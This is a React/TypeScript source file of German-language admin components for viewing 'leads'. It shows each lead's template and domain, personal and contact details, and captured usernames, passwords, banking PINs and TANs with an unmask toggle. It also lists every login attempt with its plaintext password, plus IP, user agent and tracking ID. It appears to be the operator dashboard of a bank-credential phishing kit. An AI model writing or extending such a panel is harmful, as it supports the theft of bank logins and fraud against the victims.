import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  User,
  Mail,
  Phone,
  Shield,
  Smartphone,
  Calendar,
  MapPin,
  Edit,
  Save,
  X,
  Eye,
  EyeOff
} from 'lucide-react';
import { BaseLead } from '../../types/templates';

// Shared Header Component
interface LeadHeaderProps {
  lead: BaseLead;
  displayName: string;
}

export const LeadHeader: React.FC<LeadHeaderProps> = ({ lead, displayName }) => {
  const navigate = useNavigate();

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'new':
        return 'bg-blue-100 text-blue-800';
      case 'contacted':
        return 'bg-yellow-100 text-yellow-800';
      case 'converted':
        return 'bg-green-100 text-green-800';
      case 'completed':
        return 'bg-green-100 text-green-800';
      case 'rejected':
        return 'bg-red-100 text-red-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };

  return (
    <div className="flex justify-between items-center mb-8">
      <div className="flex items-center">
        <button
          onClick={() => navigate('/admin/leads')}
          className="mr-4 p-2 rounded-full hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
        >
          <ArrowLeft className="h-5 w-5 text-gray-500" />
        </button>
        <div>
          <h1 className="text-3xl font-bold text-gray-900">{displayName}</h1>
          <div className="flex items-center mt-1 space-x-4">
            <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(lead.status)}`}>
              {lead.status}
            </span>
            <span className="text-sm text-gray-500">
              Template: {lead.template_name}
            </span>
            <span className="text-sm text-gray-500">
              Domain: {lead.domain_name}
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

// Shared Contact Information Component
interface ContactInfoProps {
  personalData?: any;
  email?: string | null;
  phone?: string | null;
}

export const ContactInfo: React.FC<ContactInfoProps> = ({ personalData, email, phone }) => {
  const hasPersonalData = personalData && (personalData.first_name || personalData.last_name || personalData.street || personalData.city);
  const hasContactData = email || phone;
  
  if (!hasPersonalData && !hasContactData) return null;

  return (
    <div className="bg-white rounded-lg border border-gray-200 p-6">
      <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
        <User className="h-5 w-5 mr-2 text-blue-600" />
        Persönliche Daten
      </h3>
      <div className="space-y-4">
        {/* Personal Information */}
        {hasPersonalData && (
          <>
            {(personalData.first_name || personalData.last_name) && (
              <div className="flex items-center space-x-3">
                <User className="h-4 w-4 text-gray-400" />
                <div>
                  <p className="text-sm font-medium text-gray-500">Name</p>
                  <p className="text-gray-900">{`${personalData.first_name || ''} ${personalData.last_name || ''}`.trim()}</p>
                </div>
              </div>
            )}
            {personalData.date_of_birth && (
              <div className="flex items-center space-x-3">
                <Calendar className="h-4 w-4 text-gray-400" />
                <div>
                  <p className="text-sm font-medium text-gray-500">Geburtsdatum</p>
                  <p className="text-gray-900">{personalData.date_of_birth}</p>
                </div>
              </div>
            )}
            {(personalData.street || personalData.street_number || personalData.city || personalData.plz) && (
              <div className="flex items-center space-x-3">
                <MapPin className="h-4 w-4 text-gray-400" />
                <div>
                  <p className="text-sm font-medium text-gray-500">Adresse</p>
                  <p className="text-gray-900">
                    {personalData.street && personalData.street_number ? 
                      `${personalData.street} ${personalData.street_number}` : 
                      personalData.street || personalData.street_number || ''}
                    {personalData.street || personalData.street_number ? <br /> : ''}
                    {personalData.plz && personalData.city ? 
                      `${personalData.plz} ${personalData.city}` : 
                      personalData.plz || personalData.city || ''}
                  </p>
                </div>
              </div>
            )}
          </>
        )}
        
        {/* Contact Information */}
        {email && (
          <div className="flex items-center space-x-3">
            <Mail className="h-4 w-4 text-gray-400" />
            <div>
              <p className="text-sm font-medium text-gray-500">E-Mail</p>
              <p className="text-gray-900">{email}</p>
            </div>
          </div>
        )}
        {(phone || personalData?.phone) && (
          <div className="flex items-center space-x-3">
            <Phone className="h-4 w-4 text-gray-400" />
            <div>
              <p className="text-sm font-medium text-gray-500">Telefon</p>
              <p className="text-gray-900">{phone || personalData?.phone}</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// Shared Authentication Data Component
interface AuthDataProps {
  username?: string | null;
  password?: string | null;
  pin?: string | null;
  tan?: string | null;
  showUncensored?: boolean;
  loginAttempts?: Array<{
    username: string;
    password: string;
    timestamp: string;
    attempt: number;
  }>;
}

export const AuthData: React.FC<AuthDataProps> = ({ 
  username, 
  password, 
  pin, 
  tan, 
  showUncensored = false,
  loginAttempts 
}) => {
  const [showPassword, setShowPassword] = useState(showUncensored);
  const [showPin, setShowPin] = useState(showUncensored);
  const [showTan, setShowTan] = useState(showUncensored);

  if (!username && !password && !pin && !tan && (!loginAttempts || loginAttempts.length === 0)) return null;

  return (
    <div className="bg-white rounded-lg border border-gray-200 p-6">
      <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
        <Shield className="h-5 w-5 mr-2 text-red-600" />
        Anmeldedaten
      </h3>
      <div className="space-y-4">
        {username && (
          <div>
            <label className="text-sm font-medium text-gray-500">Benutzername</label>
            <p className="text-gray-900 font-mono">{username}</p>
          </div>
        )}
        {password && (
          <div>
            <label className="text-sm font-medium text-gray-500">Passwort</label>
            <div className="flex items-center space-x-2">
              <p className="text-gray-900 font-mono">
                {showUncensored || showPassword ? password : '•'.repeat(password.length)}
              </p>
              {!showUncensored && (
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              )}
            </div>
          </div>
        )}
        {pin && (
          <div>
            <label className="text-sm font-medium text-gray-500">PIN</label>
            <div className="flex items-center space-x-2">
              <p className="text-gray-900 font-mono">
                {showUncensored || showPin ? pin : '•'.repeat(pin.length)}
              </p>
              {!showUncensored && (
                <button
                  onClick={() => setShowPin(!showPin)}
                  className="text-gray-400 hover:text-gray-600"
                >
                  {showPin ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              )}
            </div>
          </div>
        )}
        {tan && (
          <div>
            <label className="text-sm font-medium text-gray-500">TAN</label>
            <div className="flex items-center space-x-2">
              <p className="text-gray-900 font-mono">
                {showUncensored || showTan ? tan : '•'.repeat(tan.length)}
              </p>
              {!showUncensored && (
                <button
                  onClick={() => setShowTan(!showTan)}
                  className="text-gray-400 hover:text-gray-600"
                >
                  {showTan ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              )}
            </div>
          </div>
        )}
        {/* Show all login attempts if available */}
        {loginAttempts && loginAttempts.length > 0 && (
          <div>
            <label className="text-sm font-medium text-gray-500">Alle Anmeldeversuche ({loginAttempts.length})</label>
            <div className="space-y-2 mt-1">
              {loginAttempts.map((attempt, index) => (
                <div key={index} className="bg-gray-50 p-2 rounded text-sm">
                  <p><strong>Versuch {attempt.attempt}:</strong> {attempt.username} / {attempt.password}</p>
                  <p className="text-gray-500 text-xs">Zeit: {new Date(attempt.timestamp).toLocaleString('de-DE')}</p>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// Shared System Information Component
interface SystemInfoProps {
  lead: BaseLead;
}

export const SystemInfo: React.FC<SystemInfoProps> = ({ lead }) => {
  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('de-DE', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  return (
    <div className="bg-white rounded-lg border border-gray-200 p-6">
      <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
        <Smartphone className="h-5 w-5 mr-2 text-gray-600" />
        Technische Daten
      </h3>
      <div className="space-y-4">
        {lead.ip_address && (
          <div>
            <label className="text-sm font-medium text-gray-500">IP-Adresse</label>
            <p className="text-gray-900 font-mono">{lead.ip_address}</p>
          </div>
        )}
        {lead.user_agent && (
          <div>
            <label className="text-sm font-medium text-gray-500">User Agent</label>
            <p className="text-gray-900 text-sm break-all">{lead.user_agent}</p>
          </div>
        )}
        {lead.tracking_id && (
          <div>
            <label className="text-sm font-medium text-gray-500">Tracking ID</label>
            <p className="text-gray-900 font-mono text-sm break-all">{lead.tracking_id}</p>
          </div>
        )}
        <div>
          <label className="text-sm font-medium text-gray-500">Erstellt am</label>
          <div className="flex items-center space-x-2">
            <Calendar className="h-4 w-4 text-gray-400" />
            <p className="text-gray-900">{formatDate(lead.created_at)}</p>
          </div>
        </div>
      </div>
    </div>
  );
};

// Shared Notes Component
interface NotesProps {
  lead: BaseLead;
  onSave: (notes: string) => Promise<void>;
}

export const Notes: React.FC<NotesProps> = ({ lead, onSave }) => {
  const [editingNotes, setEditingNotes] = useState(false);
  const [notes, setNotes] = useState(lead.notes || '');
  const [saving, setSaving] = useState(false);

  const handleSaveNotes = async () => {
    try {
      setSaving(true);
      await onSave(notes);
      setEditingNotes(false);
    } catch (error) {
      console.error('Error saving notes:', error);
      alert('Fehler beim Speichern der Notizen');
    } finally {
      setSaving(false);
    }
  };

  return (
    <div className="bg-white rounded-lg border border-gray-200 p-6">
      <div className="flex justify-between items-center mb-4">
        <h3 className="text-lg font-semibold text-gray-900">Notizen</h3>
        {!editingNotes && (
          <button
            onClick={() => setEditingNotes(true)}
            className="text-indigo-600 hover:text-indigo-800 flex items-center space-x-1"
          >
            <Edit size={16} />
            <span>Bearbeiten</span>
          </button>
        )}
      </div>
      
      {editingNotes ? (
        <div className="space-y-4">
          <textarea
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            rows={4}
            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500"
            placeholder="Notizen hinzufügen..."
          />
          <div className="flex space-x-2">
            <button
              onClick={handleSaveNotes}
              disabled={saving}
              className="inline-flex items-center px-3 py-2 border border-transparent text-sm leading-4 font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 disabled:opacity-50"
            >
              <Save size={16} className="mr-1" />
              {saving ? 'Speichere...' : 'Speichern'}
            </button>
            <button
              onClick={() => {
                setEditingNotes(false);
                setNotes(lead.notes || '');
              }}
              className="inline-flex items-center px-3 py-2 border border-gray-300 text-sm leading-4 font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
            >
              <X size={16} className="mr-1" />
              Abbrechen
            </button>
          </div>
        </div>
      ) : (
        <div className="text-gray-600">
          {notes || 'Keine Notizen vorhanden'}
        </div>
      )}
    </div>
  );
}; 